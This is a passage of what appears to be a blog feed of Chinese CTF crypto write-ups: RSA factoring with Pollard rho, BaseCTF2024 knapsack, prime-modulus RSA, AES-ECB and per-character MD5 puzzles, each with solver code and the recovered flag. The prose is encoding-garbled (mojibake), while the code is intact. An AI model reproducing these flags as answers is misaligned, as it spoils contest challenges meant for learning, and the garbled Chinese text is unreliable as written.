class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></p><p>å¯ä»¥ä¼°è®¡kå¾ˆå¤§ï¼Œé‚£ä¹ˆæ ¹æ®å‰é¢çš„æ¨å¯¼<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï•</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo>=</mo><mi>L</mi><mo>âˆ—</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">\phi(N)=L*k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>å°±è¯´æ˜äº†p-1å’Œq-1æœ‰ä¸€ä¸ªè¾ƒå¤§çš„å› å­</p><p>ç„¶åxennyå¸ˆå‚…è¯´è¿˜æ˜¯å¯ä»¥ç”¨PollardRhoï¼Œæˆ‘è¿˜æ˜¯ä¸ç†è§£ï¼Œæ‰€ä»¥æ˜¯p-1å’Œq-1æœ‰ä¸€ä¸ªè¾ƒå¤§çš„å› å­å°±å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•å’¯ï¼Ÿ</p><p>è·Ÿä¸Šé¢˜expå®Œå…¨ä¸€æ ·</p><h2 id="exp-25"><a class="markdownIt-Anchor" href="#exp-25"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>N=<span class="hljs-number">1108103848370322618250236235096737547381026108763302516499816051432801216813681568375319595638932562835292256776016949573972732881586209527824393027428125964599378845347154409633878436868422905300799413838645686430352484534761305185938956589612889463246508935994301443576781452904666072122465831585156151</span><br>e=<span class="hljs-number">65537</span><br>c = <span class="hljs-number">254705401581808316199469430068831357413481187288921393400711004895837418302514065107811330660948313420965140464021505716810909691650540609799307500282957438243553742714371028405100267860418626513481187170770328765524251710154676478766892336610743824131087888798846367363259860051983889314134196889300426</span><br><br>f = <span class="hljs-keyword">lambda</span> x,n: (<span class="hljs-built_in">pow</span>(x, n - <span class="hljs-number">1</span>, n) + <span class="hljs-number">3</span>) % n<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">phllard_rho</span>(<span class="hljs-params">n</span>):<br>    i = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        a = getRandomRange(<span class="hljs-number">2</span>, n)<br>        b = f(a, n)<br>        j = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            p = GCD(<span class="hljs-built_in">abs</span>(a - b), n)<br>            <span class="hljs-keyword">if</span> p == n:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">elif</span> p &gt; <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> (p, n // p)<br>            <span class="hljs-keyword">else</span>:<br>                a = f(a, n)<br>                b = f(f(b, n), n)<br>            j += <span class="hljs-number">1</span><br>        i += <span class="hljs-number">1</span><br>p,q=phllard_rho(N)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)),N))))<br><span class="hljs-comment">#b&quot;TSGCTF&#123;Roll_Safe:_You_c4n&#x27;t_be_exploited_1f_you_are_a_minimali5t_enough_and_y0u_don&#x27;t_have_any_s3crets_in_your_mind&#125;&quot;</span><br><span class="hljs-comment">#NSSCTF&#123;Roll_Safe:_You_c4n&#x27;t_be_exploited_1f_you_are_a_minimali5t_enough_and_y0u_don&#x27;t_have_any_s3crets_in_your_mind&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>RSA</tag>
      
      <tag>Xennyçš„RSAé¢˜å•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BaseCTF2024-Crypto-naby</title>
    <link href="/2024/12/05/basectf2024/"/>
    <url>/2024/12/05/basectf2024/</url>
    
    <content type="html"><![CDATA[<blockquote><p>å®˜æ–¹wp:<a href="https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh">https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh</a></p><p>å¤ç°å¹³å°: <a href="https://gz.imxbt.cn/games/13">https://gz.imxbt.cn/games/13</a></p></blockquote><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="week1"><a class="markdownIt-Anchor" href="#week1"></a> week1</h2><h3 id="babypack"><a class="markdownIt-Anchor" href="#babypack"></a> babypack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span><br>m=bytes_to_long(flag)<br>bin_m=<span class="hljs-built_in">bin</span>(m)[<span class="hljs-number">2</span>:]<br>length=<span class="hljs-built_in">len</span>(bin_m)<br><br>a=[<span class="hljs-number">1</span>]<br><span class="hljs-built_in">sum</span>=<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length-<span class="hljs-number">1</span>):<br>    temp=random.randint(<span class="hljs-number">2</span>*<span class="hljs-built_in">sum</span>+<span class="hljs-number">1</span>,<span class="hljs-number">4</span>*<span class="hljs-built_in">sum</span>)<br>    <span class="hljs-built_in">sum</span>=<span class="hljs-built_in">sum</span>+temp<br>    a.append(temp)<br><br>a=a[::-<span class="hljs-number">1</span>]<br>c=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>    <span class="hljs-keyword">if</span> bin_m[i]==<span class="hljs-string">&#x27;1&#x27;</span>:<br>        c=c+a[i]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a=&quot;</span>,a)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c=&quot;</span>,c)<br></code></pre></td></tr></table></figure><p>ç®€å•çš„è¶…é€’å¢åºåˆ—ï¼ˆä¸æ‡‚çš„å¯ä»¥ç®€å•äº†è§£ä¸€ä¸‹èƒŒåŒ…å¯†ç ï¼‰</p><p>ä»å°¾å¼€å§‹éå†åˆ—è¡¨aï¼Œå¤§äºcå°±ä¸º0ï¼Œå°äºç­‰äºcå°±ä¸º1ï¼Œå¹¶ä¸”cè¦å‡å»è¿™ä¸ªå€¼</p><p>(æ•°æ®å¤ªå¤šæˆ‘å°±ä¸è´´äº†)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#BaseCTF&#123;2c4b0c15-3bee-4e4a-be6e-0f21e44bd4c9&#125;</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>a=<br>c=<span class="hljs-number">2488656295807929935404316556194747314175977860755594014838879551525915558042003735363919054632036359039039831854134957725034750353847782168033537523854288427613513938991943920607437000388885418821419115067060003426834</span><br>bin_m=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">if</span> c&gt;=i:<br>        bin_m+=<span class="hljs-string">&quot;1&quot;</span><br>        c=c-i<br>    <span class="hljs-keyword">else</span>:<br>        bin_m+=<span class="hljs-string">&quot;0&quot;</span><br>m=<span class="hljs-built_in">int</span>(bin_m,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h3 id="babyrsa"><a class="markdownIt-Anchor" href="#babyrsa"></a> babyrsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span><br>m=bytes_to_long(flag)<br><br>n=getPrime(<span class="hljs-number">1024</span>)<br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">n = 104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>å•ç´ æ•°RSA</p><blockquote><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï•</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>è¡¨ç¤ºä»1åˆ°nä¹‹é—´ï¼Œæœ‰å¤šå°‘ä¸ªæ•°ä¸näº’ç´ ã€‚</p><p>è®¡ç®—æ–¹æ³•ï¼šæ’é™¤æ‰ä¸ä¸näº’ç´ çš„æ•°ã€‚</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï•</mi><mo stretchy="false">(</mo><mi>p</mi><mi>q</mi><mo stretchy="false">)</mo><mo>=</mo><mi>p</mi><mi>q</mi><mo>âˆ’</mo><mi>p</mi><mo>âˆ’</mo><mi>q</mi><mo>+</mo><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(pq)=pq-p-q+1 = (p-1)(q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p>è¿™é¢˜nå·²ç»æ˜¯ç´ æ•°äº†ï¼Œ1åˆ°n-1éƒ½ä¸näº’ç´ ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï•</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\phi(n)=n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p></blockquote><p>æ±‚åˆ°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï•</mi></mrow><annotation encoding="application/x-tex">\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">Ï•</span></span></span></span>ä¹‹åå°±æ­£å¸¸åšå°±è¡Œ</p><p>ï¼ˆç†è§£RSAæœ€é‡è¦çš„ä¸€ç‚¹æ˜¯ææ‡‚e*d=1 mod(Ï†(n)ï¼‰ï¼Œè¦ç†è§£ä¸ºä»€ä¹ˆè¿™é‡Œä¸ºä»€ä¹ˆæ˜¯å–Ï†(n)ï¼‰</p><p>ï¼ˆå¾ˆéš¾ç»·ï¼Œä¸ºä»€ä¹ˆé‚£ä¹ˆå¤šäººé—®æˆ‘næ€ä¹ˆåˆ†è§£ï¼Œn=getPrime(1024)å·²ç»æ˜¯ç´ æ•°äº†ï¼Œä¸éœ€è¦åˆ†è§£äº†ã€‚ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">104183228088542215832586853960545770129432455017084922666863784677429101830081296092160577385504119992684465370064078111180392569428724567004127219404823572026223436862745730173139986492602477713885542326870467400963852118869315846751389455454901156056052615838896369328997848311481063843872424140860836988323</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">82196463059676486575535008370915456813185183463924294571176174789532397479953946434034716719910791511862636560490018194366403813871056990901867869218620209108897605739690399997114809024111921392073218916312505618204406951839504667533298180440796183056408632017397568390899568498216649685642586091862054119832</span><br><br>phin=n-<span class="hljs-number">1</span><br>d=gmpy2.invert(e,phin)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#b&#x27;BaseCTF&#123;7d7c90ae-1127-4170-9e0d-d796efcd305b&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="hellpcrypto"><a class="markdownIt-Anchor" href="#hellpcrypto"></a> hellpCrypto</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">import</span> random<br><br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span><br><br>key=random.randbytes(<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(bytes_to_long(key))<br><br>my_aes=AES.new(key=key,mode=AES.MODE_ECB)<br><span class="hljs-built_in">print</span>(my_aes.encrypt(pad(flag,AES.block_size)))<br><br><span class="hljs-comment"># key1 = 208797759953288399620324890930572736628</span><br><span class="hljs-comment"># c = b&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;</span><br></code></pre></td></tr></table></figure><p>ç›´æ¥AESè§£å¯†å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br>key1 = <span class="hljs-number">208797759953288399620324890930572736628</span><br>c = <span class="hljs-string">b&#x27;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe&#123;\xae&#x27;</span><br>my_aes1=AES.new(key=long_to_bytes(key1),mode=AES.MODE_ECB)<br><span class="hljs-built_in">print</span>(my_aes1.decrypt(c))<br><br><span class="hljs-comment">#b&#x27;BaseCTF&#123;b80bf679-1869-4fde-b3f9-d51b872d31fb&#125;\x03\x03\x03&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="ä½ ä¼šç®—md5å—"><a class="markdownIt-Anchor" href="#ä½ ä¼šç®—md5å—"></a> ä½ ä¼šç®—md5å—</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>flag=<span class="hljs-string">&#x27;BaseCTF&#123;&#125;&#x27;</span><br><br>output=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    my_md5=hashlib.md5()<br>    my_md5.update(i.encode())<br>    output.append(my_md5.hexdigest())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;output =&quot;</span>,output)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">output = [&#x27;9d5ed678fe57bcca610140957afab571&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;03c7c0ace395d80182db07ae2c30f034&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;0d61f8370cad1d412f80b84d143e1257&#x27;, &#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;, &#x27;800618943025315f869e4e1f09471012&#x27;, &#x27;f95b70fdc3088560732a5ac135644506&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;, &#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>å•å­—ç¬¦md5ï¼Œå¯ä»¥ç†è§£ä¸ºå•å­—èŠ‚åŠ å¯†ï¼Œæ²¡æœ‰è¡Œåˆ—è½¬æ¢æ··æ·†çš„è¯ï¼Œä¸€èˆ¬éƒ½å¯ä»¥ç›´æ¥çˆ†ç ´</p><p>ï¼ˆå¦‚æœç­”æ¡ˆä¸å¯¹ä¸€èˆ¬å°±æ˜¯å­—ç¬¦é›†çš„é—®é¢˜ï¼Œæ•´æ•°32-126å°±æ˜¯å¯è§å­—ç¬¦èŒƒå›´ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><br>output = [<span class="hljs-string">&#x27;9d5ed678fe57bcca610140957afab571&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;03c7c0ace395d80182db07ae2c30f034&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <span class="hljs-string">&#x27;0d61f8370cad1d412f80b84d143e1257&#x27;</span>, <span class="hljs-string">&#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;</span>, <span class="hljs-string">&#x27;800618943025315f869e4e1f09471012&#x27;</span>, <span class="hljs-string">&#x27;f95b70fdc3088560732a5ac135644506&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span 